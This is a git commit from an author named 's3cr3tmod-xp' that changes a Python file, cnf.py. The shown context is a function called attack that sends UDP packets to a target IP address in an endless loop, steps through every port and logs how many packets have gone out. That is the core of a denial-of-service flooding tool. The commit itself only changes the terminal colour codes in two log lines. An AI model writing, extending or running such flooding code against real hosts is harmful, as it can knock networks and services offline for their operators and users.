c1e0f2259c72e8af031246372069e2ed7b28e792
s3cr3tmod-xp <s3cr3tmod@gmail.com>
2026-01-28 20:24:10 +0700

    Update cnf.py

--- cnf.py
+++ cnf.py
@@ -51,8 +51,8 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip} \033[3mport:\033[0m\033[96m{port} \033[36mSent•> \033[37m{sent} \033[7mthreads\033[0m\033[38;5;220m•> {threading.get_ident()}")
-            log_message(f"\033[38;5;220mIp Address\033[38;5;39m•> {ip} \033[3mport:\033[0m\033[37m{port}\033[0m \033[94mSent•> \033[31m{sent} \033[7mpacket_size\033[0m\033[37m•> {packet_size}")
+            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip} \033[3mport:\033[0m\033[96m{port} \033[36mSent•> \033[37m{sent} \033[3mthreads\033[0m\033[38;5;220m•> {threading.get_ident()}")
+            log_message(f"\033[38;5;220mIp Address\033[38;5;39m•> {ip} \033[3mport:\033[0m\033[37m{port}\033[0m \033[94mSent•> \033[31m{sent} \033[3mpacket_size\033[0m\033[37m•> {packet_size}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
